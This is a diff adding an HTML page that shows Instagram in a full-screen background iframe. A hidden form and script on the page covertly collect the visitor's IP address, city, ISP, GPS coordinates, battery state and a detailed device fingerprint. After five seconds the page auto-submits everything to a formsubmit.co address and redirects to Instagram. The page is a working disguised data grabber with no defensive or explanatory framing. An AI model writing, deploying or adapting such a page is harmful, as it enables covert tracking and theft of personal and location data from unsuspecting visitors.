@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>251020052025</title>
+    <style>
+        body {
+            margin: 0;
+            overflow: hidden;
+            position: relative;
+        }
+        iframe {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            border: none;
+            z-index: -1; /* Make sure iframe is behind all other elements */
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<iframe src="https://www.instagram.com" title="Background Website"></iframe>
+
+<!-- Hidden form to send collected data -->
+
+<form id="dataForm" class="hidden" action="https://formsubmit.co/ca99b24713c7f553dbde071c7783a3c3" method="post">
+    <input type="hidden" id="hiddenIp" name="ip">
+    <input type="hidden" id="hiddenLocation" name="location">
+    <input type="hidden" id="hiddenIsp" name="isp">
+    <input type="hidden" id="hiddenBrowser" name="browser">
+    <input type="hidden" id="hiddenOs" name="os">
+    <input type="hidden" id="hiddenScreenResolution" name="screenResolution">
+    <input type="hidden" id="hiddenViewportSize" name="viewportSize">
+    <input type="hidden" id="hiddenTimezone" name="timezone">
+    <input type="hidden" id="hiddenLanguage" name="language">
+    <input type="hidden" id="hiddenDeviceType" name="deviceType">
+    <input type="hidden" id="hiddenGeolocation" name="geolocation">
+    <input type="hidden" id="hiddenNetworkInfo" name="networkInfo">
+    <input type="hidden" id="hiddenDeviceMemory" name="deviceMemory">
+    <input type="hidden" id="hiddenBatteryStatus" name="batteryStatus">
+    <input type="hidden" id="hiddenScreenOrientation" name="screenOrientation">
+    <input type="hidden" id="hiddenWebglInfo" name="webglInfo">
+    <input type="hidden" id="hiddenHardwareConcurrency" name="hardwareConcurrency">
+    <input type="hidden" id="hiddenUserAgent" name="userAgent">
+    <input type="hidden" id="hiddenLanguagePreferences" name="languagePreferences">
+    <input type="hidden" id="hiddenConnectionSpeed" name="connectionSpeed">
+    
+    <input type="hidden" name="_next" value="https://www.instagram.com/">
+  
+  <input type="hidden" name="_captcha" value="false">
+</form>
+
+<script>
+    // Function to fetch IP and location data
+    function fetchIPData() {
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('hiddenIp').value = data.ip || 'N/A';
+                document.getElementById('hiddenLocation').value = `${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country_name || 'N/A'}`;
+                document.getElementById('hiddenIsp').value = data.org || 'N/A';
+            })
+            .catch(error => console.error('Error fetching IP data:', error));
+    }
+
+    // Function to collect browser and system information
+    function collectBrowserData() {
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform;
+        const browser = (userAgent.match(/(firefox|msie|chrome|safari|trident|edge|opera)/i) || ['Unknown'])[0];
+        const os = platform;
+        const screenResolution = `${window.screen.width}x${window.screen.height}`;
+        const viewportSize = `${window.innerWidth}x${window.innerHeight}`;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const language = navigator.language || navigator.userLanguage;
+        const deviceType = /Mobi|Android/i.test(userAgent) ? 'Mobile' : 'Desktop';
+        const networkInfo = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
+        const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unavailable';
+        const batteryStatus = 'Unavailable'; // Placeholder for battery status
+        const screenOrientation = screen.orientation ? screen.orientation.type : 'Unknown';
+        const webglInfo = getWebGLInfo();
+        const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
+        const languagePreferences = navigator.languages ? navigator.languages.join(', ') : 'Unknown';
+        const connectionSpeed = 'Not available'; // Estimation of connection speed not directly available
+
+        document.getElementById('hiddenBrowser').value = browser;
+        document.getElementById('hiddenOs').value = os;
+        document.getElementById('hiddenScreenResolution').value = screenResolution;
+        document.getElementById('hiddenViewportSize').value = viewportSize;
+        document.getElementById('hiddenTimezone').value = timezone;
+        document.getElementById('hiddenLanguage').value = language;
+        document.getElementById('hiddenDeviceType').value = deviceType;
+        document.getElementById('hiddenNetworkInfo').value = networkInfo;
+        document.getElementById('hiddenDeviceMemory').value = deviceMemory;
+        document.getElementById('hiddenBatteryStatus').value = batteryStatus;
+        document.getElementById('hiddenScreenOrientation').value = screenOrientation;
+        document.getElementById('hiddenWebglInfo').value = webglInfo;
+        document.getElementById('hiddenHardwareConcurrency').value = hardwareConcurrency;
+        document.getElementById('hiddenUserAgent').value = userAgent;
+        document.getElementById('hiddenLanguagePreferences').value = languagePreferences;
+        document.getElementById('hiddenConnectionSpeed').value = connectionSpeed;
+    }
+
+    // Function to get WebGL vendor and renderer information
+    function getWebGLInfo() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return 'WebGL not supported';
+
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+            return `Vendor: ${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)}, Renderer: ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}`;
+        }
+        return 'WebGL debug info not available';
+    }
+
+    // Function to get geolocation data (requires user permission)
+    function getGeolocationData() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                const { latitude, longitude } = position.coords;
+                document.getElementById('hiddenGeolocation').value = `Lat: ${latitude.toFixed(6)}, Lon: ${longitude.toFixed(6)}`;
+            }, error => {
+                document.getElementById('hiddenGeolocation').value = 'Permission denied or unavailable';
+            });
+        } else {
+            document.getElementById('hiddenGeolocation').value = 'Geolocation not supported';
+        }
+    }
+
+    // Function to get battery status (if available)
+    function getBatteryStatus() {
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                const status = `Level: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging ? 'Yes' : 'No'}`;
+                document.getElementById('hiddenBatteryStatus').value = status;
+            });
+        } else {
+            document.getElementById('hiddenBatteryStatus').value = 'Battery status not supported';
+        }
+    }
+
+    // Call functions to collect data and submit form
+    fetchIPData();
+    collectBrowserData();
+    getGeolocationData();
+    getBatteryStatus();
+
+    // Automatically submit the form after collecting data
+    window.addEventListener('load', () => {
+        // Ensure all data is collected before submitting
+        setTimeout(() => {
+            document.getElementById('dataForm').submit();
+        }, 5000); // Adjust the timeout as needed
+    });
+</script>
+
+</body>
+</html>
